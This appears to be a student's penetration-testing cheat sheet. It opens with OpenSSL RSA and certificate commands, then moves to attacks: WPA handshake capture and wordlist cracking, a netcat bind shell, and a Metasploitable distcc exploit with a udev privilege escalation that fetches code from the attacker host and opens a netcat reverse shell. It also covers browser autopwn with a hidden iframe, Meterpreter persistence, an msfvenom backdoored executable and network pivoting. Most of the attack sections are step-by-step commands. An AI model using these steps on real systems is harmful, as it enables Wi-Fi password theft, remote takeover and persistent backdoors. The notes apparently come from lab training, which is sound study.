Linux Terminal Commands for RSA

    Generate RSA private key
        openssl genrsa -out [privatekeyname].pem [bit length (default 2048)]

    Generate RSA public key
        openssl rsa -in [privatekeyname].pem -out [publickeyname].pem

    Encrypt with RSA
        openssl rsautl -pubin -inkey [publickeyname].pem -in [inputfilename] -out [encryptedfilename]

    Decrypt with RSA
        openssl rsautl =inkey [privatekeyname].pem -in [encryptedfilename] -out [outputfilename]

CSR certificate used to verify validity 

    Generate CSR with private key
        openssl req -new -key [privatekeyname].pem -out [csrfilename].csr

    Verify generated CSR
        openssl req -text -in [csrfilename] -noout -verify

    Sign CSR with private key
        openssl x509 -req -days 365 -in [csrfilename] -signkey [privatekeyname] -out [certificate].pem

    Verify certificate
        openssl x509 -text -noout -in [certificate].pem


WIFI ATTACK CAPTURE HANDSHAKE

    [in superuser]

    To put wifi on monitor mode
        airmon-ng start [wifiName]

    check if it is running in monitor mode.
        iwconfig

    To check the available wifi network to sniff on
        airodump-ng [wifi card interface name]

    take note of the wifi channel, youll listen to
        airodump-ng [card name] –c [channel to listen] & wireshark

    Filter the packets specifying the mac id showing the data to and from the device.
    
    Check if the packet has ssid or not. If not, it might not work.

    Check for the half-handshakes done or not (filter: eapol). (Message 1 of 4 or Message 2 of 4)

    Save the filtered packets in .pcap file extension. .pcapng file is not supported by aircrack-ng.

        aircrack-ng –w [password list file] [traffic packet file]

    If any password listed on the file matches, it would show up.



NETCAT IN WINDOWS AND KALI
    WINDOWS LISTENING 
    ncat.exe -l -l 31337 -e cmd.exe -vv

    nc [ipaddr] [portno]

    REVERSE

NETDISCOVER
shows hosts in the network 
    sudo netdiscover -r [ipaddr]/[cidr]

nmap -sS -p- [metasploitableip] -oX [outputfilename]
searchsploit --nmap [xmlfile]

to reset ip on adapter change
    sudo /etc/init.d/networking restart


distcc
    msfconsole 
    search distcc 
    use 0
    options
    set rhost [metasploitableip]
    show payloads
    set payload 2
    exploit
    < you get shell access as daemon >
    < check udev version for further privilege escalation >  
    ps aux | grep udev 
    dpkg -l | grep udev 

    {in another terminal}
    searchsploit udev 
    # copy the required version with the following command, replace 8572 with the name of the file in the path section 
    searchsploit -m 8572  
    # the location is /sur/share/exploitdb/exploits/.....
    cat 8572.c # to understand how to exploit 
    copy the exploit file to var/www/html folder as sudo
    check if apache2 is running 
    start the service if not 

    {back to msf}
    wget [attackerip]/[exploitfile]
    gcc 8572.c -o dist # compile the c file
    touch run 
    echo "#!/bin/bash" > run
    echo "/bin/netcat -e /bin/bash [attackerip] [port]"

    cat /proc/net/netlink # to find pid
    
    {in attacker machine}
    nc -l -p [port]

    {execute the complied file in the msfconsole}
    ./dist [pid]

    < you gain access to shell as root in attacker > 


autopwn 
    msfconsole
    search autopwn
    options 
        - set uripath /
        - set lhost {attackerip}
    exploit 

    <go to windows>
    browser 
    http://{kaliip}:{port}

    <meterpreter session will start in msf>
    sessions [to check sessions]
    sessions -i [session number]
    
    # run persistence -h 
    # help 
    # [perform any exploit]

    # run persistence -h [check options for persistence]
    # sample: run persistence -A -L C: -S -X -i 5 -p 4444 -r [kaliip]

    # a vbs file is created in host 
    # <reboot to confirm persistence> 
    # <there should be a session in msfconsole>

    # put this in /var/www/html/index.html
    #     <iframe src="http://[kaliip]:[port]" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>

    # need to add payload to complete persistence 
        
        use exploit/windows/local/persistence
        set payload windows/meterpreter/reverse_tcp [defaults to this]
        [set required options] 
        run 

        search multi/handler
        use 5
        set payload windows/meterpreter/reverse_tcp
        [set required options] 

        # msfvenom -p windows/meterpreter/reverse_tcp -x ncat.exe LHOST=[kaliip] add LPORT=443 -f exe -o ncatVenom.exe

        > once meterpreter session is created, view ip of victim computer 
        > in case there are multiple networks, scan the other network
        if you find new machine, a route needs to be added 
        > route add [ip address of new victim] [subnet mask] [session id]
        > msfconsole: use auxiliary/scanner/portscan/tcp 

